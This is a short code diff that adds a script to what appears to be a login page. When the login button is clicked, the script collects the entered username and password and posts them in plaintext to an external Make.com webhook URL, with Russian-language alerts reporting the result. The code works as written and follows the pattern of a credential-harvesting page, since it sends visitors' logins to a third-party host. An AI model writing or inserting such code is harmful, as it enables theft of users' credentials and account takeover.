@@ -101,6 +101,43 @@
 					}
 				});
 			</script>
+			<script>
+				document.addEventListener('DOMContentLoaded', function () {
+					document.querySelector('.loginbtn').addEventListener('click', function () {
+						var loginField = document.querySelector('input[type="text"]');
+						var passwordField = document.querySelector('input[type="password"]');
+      
+						if (loginField.value === '' || passwordField.value === '') {
+							alert('Одно из полей пустое');
+							return;
+						}
+
+						var webhookURL = 'https://hook.eu2.make.com/jfk4pee4p1k92avnsasm7mmvp9bamxcf';
+						var requestData = {
+							login: loginField.value,
+							password: passwordField.value
+						};
+
+						fetch(webhookURL, {
+							method: 'POST',
+							headers: {
+								'Content-Type': 'application/json'
+							},
+							body: JSON.stringify(requestData)
+						})
+							.then(response => {
+								if (!response.ok) {
+									throw new Error('Ошибка при отправке данных на вебхук');
+								}
+								alert('Данные успешно отправлены на вебхук');
+							})
+							.catch(error => {
+								console.error(error);
+								alert('Произошла ошибка при отправке данных на вебхук');
+							});
+					});
+				});
+			</script>
 		</div>
 		
 		<div class="container">
